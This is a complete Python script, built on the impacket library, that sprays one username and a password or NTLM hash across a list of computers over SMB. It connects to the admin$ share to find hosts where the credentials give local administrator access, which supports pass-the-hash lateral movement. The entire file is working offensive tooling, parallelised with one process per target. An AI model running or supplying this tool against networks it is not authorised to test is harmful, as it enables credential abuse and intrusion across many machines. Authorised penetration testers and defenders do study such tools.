#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import sys
import argparse
import re
from impacket.smbconnection import SMBConnection
from impacket import smbconnection
import multiprocessing
import traceback


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip, target_ip, port):
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port))
        smbClient.login(username, password, domain, lmhash, nthash)
        smbClient.connectTree('admin$')
        print("[+]Success %s %s" % (username, target_ip))
        SMBConnection.close
    except smbconnection.SessionError as e:
        return
    except Exception as e:
        print(e)
        return


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Find Local Admin Access")

    group = parser.add_argument_group('authentication')
    group.add_argument('-computerlist', action='store', metavar = "computerlist", help='List of computers to spray')
    group.add_argument('-username', action="store", metavar = "username", help='Username')
    group.add_argument('-password', action="store", metavar = "password", help='Clear-text password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

    group = parser.add_argument_group('connection')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.password is None and options.hashes is None:
        parser.print_help()
        sys.exit(1)

    if options.computerlist is None:
        parser.print_help()
        sys.exit(1)

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password is None:
        password = ''
    else:
        password = options.password

    domain = ''

    #threading
    jobs = []
    with open(options.computerlist, 'r') as computers:
        for computer in computers.readlines():
            if computer.strip():
                process = multiprocessing.Process(target=login,
                    args=(options.username, password, domain, lmhash, nthash, None, None, computer.strip(), options.port))
                jobs.append(process)

    # Start the processes    
    for j in jobs:
        j.start()

    # Ensure all of the processes have finished
    for j in jobs:
        j.join()

    print("Done spraying %s Computer" % len(jobs))

if __name__ == "__main__":
    main()
